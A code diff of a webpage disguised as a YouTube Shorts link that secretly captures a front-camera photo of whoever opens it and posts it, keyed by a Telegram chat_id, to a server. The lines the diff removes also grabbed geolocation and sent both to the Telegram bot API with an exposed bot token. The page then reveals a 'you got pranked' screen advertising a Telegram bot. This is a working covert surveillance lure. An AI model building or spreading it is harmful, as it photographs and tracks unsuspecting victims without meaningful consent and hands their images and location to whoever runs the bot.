@@ -1,81 +1,146 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Location and Photo Tracker</title>
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            // Telegram chat_id ni olish uchun URL'dan query parametrlardan foydalanamiz
-            const urlParams = new URLSearchParams(window.location.search);
-            const chat_id = urlParams.get('chat_id');
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            background: #050614;
+        }
 
-            if (!chat_id) {
-                alert("Chat ID yo'q, iltimos, bot orqali kiring.");
+        #tt {
+            display: block;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+        }
+
+        #prank {
+            max-width: 700px;
+            padding: 5%;
+            width: auto;
+            margin: auto;
+        }
+
+        .picture {
+            border-radius: 20px;
+            max-width: 600px;
+            height: 400px;
+            background: #131426;
+        }
+
+        #byte_photo {
+            border-radius: 10px;
+            background-size: cover;
+            height: 100%;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+
+        .desc {
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        .desc p {
+            color: white;
+            font-size: 16px;
+        }
+
+        .desc button {
+            padding: 10px 20px;
+            color: white;
+            background: #2871FF;
+            border: none;
+            border-radius: 10px;
+        }
+
+        #canvas, #camera {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <img id="tt" src="https://variety.com/wp-content/uploads/2021/08/YouTube-Shorts-logo.png" alt="YouTube Shorts Image">
+
+    <video id="camera" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <div id="prank" style="display: none;">
+        <div class="picture">
+            <div id="byte_photo"></div>
+        </div>
+        <div class="desc">
+            <p>🙊 Тебя пранканули через бота <span>@Photolovyshkabot</span></p>
+            <button onclick="location.href='https://t.me/Photolovyshkabot?start=site'">Перейти в бот</button>
+        </div>
+    </div>
+
+    <script>
+        async function initCamera() {
+            const video = document.getElementById('camera');
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" }
+            });
+            video.srcObject = stream;
+
+            video.addEventListener('loadeddata', () => {
+                setTimeout(capturePhoto, 1000);
+            });
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('camera');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            const dataUrl = canvas.toDataURL('image/jpeg');
+
+            document.getElementById('prank').style.display = 'block';
+            document.getElementById('tt').style.display = 'none';
+            document.getElementById('byte_photo').style.backgroundImage = `url(${dataUrl})`;
+
+            sendPhotoToServer(dataUrl);
+        }
+
+        async function sendPhotoToServer(photoData) {
+            const urlParams = new URLSearchParams(window.location.search);
+            const chatId = urlParams.get('chat_id');
+
+            if (!chatId) {
+                console.error('Chat ID not found in URL');
                 return;
             }
 
-            // 1. Foydalanuvchi joylashuvini olish
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function (position) {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-
-                    // 2. Foydalanuvchi kamerasidan rasm olish
-                    navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
-                        let video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.play();
-
-                        let canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-
-                        // 1 soniyadan keyin surat olish
-                        setTimeout(function () {
-                            let context = canvas.getContext('2d');
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                            // Rasmni Base64 formatida olish
-                            let photo = canvas.toDataURL('image/png');
-
-                            // Telegram botiga joylashuv va rasmni yuborish
-                            fetch('https://api.telegram.org/bot6233093483:AAEAkRHWiJpvDwOxPhSHLMvKpoHmwAogsMQ/sendMessage', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify({
-                                    chat_id: chat_id,
-                                    text: `Joylashuv: Latitude: ${latitude}, Longitude: ${longitude}`
-                                })
-                            });
-
-                            fetch('https://api.telegram.org/bot6233093483:AAEAkRHWiJpvDwOxPhSHLMvKpoHmwAogsMQ/sendPhoto', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify({
-                                    chat_id: chat_id,
-                                    photo: photo
-                                })
-                            });
-
-                            // Video oqimini to'xtatish
-                            stream.getTracks().forEach(track => track.stop());
-                        }, 1000);
-                    });
+            try {
+                const response = await fetch('/upload', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams({
+                        chat_id: chatId,
+                        photoData: photoData
+                    })
                 });
-            } else {
-                alert("Geolokatsiya qo'llab-quvvatlanmaydi.");
+
+                if (response.ok) {
+                    console.log("Photo successfully sent to server");
+                } else {
+                    console.error('Error while sending photo:', await response.text());
+                }
+            } catch (error) {
+                console.error('Error:', error);
             }
-        });
+        }
+
+        document.addEventListener('DOMContentLoaded', initCamera);
     </script>
-</head>
-<body>
-    <h1>Location and Photo Tracker</h1>
 </body>
 </html>
 
